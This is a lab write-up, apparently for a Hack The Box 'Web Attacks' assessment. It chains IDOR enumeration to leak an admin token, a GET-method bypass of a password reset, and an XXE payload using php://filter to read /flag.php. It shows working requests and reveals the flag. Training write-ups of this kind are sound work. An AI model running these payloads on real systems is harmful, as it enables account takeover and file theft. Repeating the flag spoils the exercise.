# Web Attacks - Skills Assessment
## Questions
1. Try to escalate your privileges and exploit different vulnerabilities to read the flag at '/flag.php' **Answer: HTB{m4573r_w3b_4774ck3r}**
   - Identified 2 IDORS at `GET /api.php/user/{uid}` and `GET /api.php/token/{uid}`. Feed `GET /api.php/user/{uid}` to intruder and grep and match for admin, found the admin user:
        ```
        GET /api.php/user/52 HTTP/1.1
        ```
        ```
        HTTP/1.1 200 OK
        {"uid":"52","username":"a.corrales","full_name":"Amor Corrales","company":"Administrator"}
        ```
   - Use this endpoint to get the admin token:
        ```
        GET /api.php/token/52
        ```
        ```
        HTTP/1.1 200 OK
        {"token":"e51a85fa-17ac-11ec-8e51-e78234eb7b0c"}
        ```
   - The `POST /reset.php` correctly applied protection against unauthorized requests. But changing it to GET would bypass the check, abuse this flaw to reset the admin password and login as the admin with this new credential (`a.corrales`:`1`)
   - With the admin account we discover a XXE vulnerability at `POST /addEvent.php`, use the classic XXE file disclosure technique to read the flag:
        ```
        POST /addEvent.php HTTP/1.1

        <?xml version="1.0" encoding="UTF-8"?>
                <!DOCTYPE email [
                <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=/flag.php">
        ]>
        <root>
            <name>&company;</name>
            <details>x</details>
            <date>y</date>
        </root>       
        ```
        ```
        HTTP/1.1 200 OK

        Event 'PD9waHAgJGZsYWcgPSAiSFRCe200NTczcl93M2JfNDc3NGNrM3J9IjsgPz4K' has been created.
        ```
   - Base64 decode that to read flag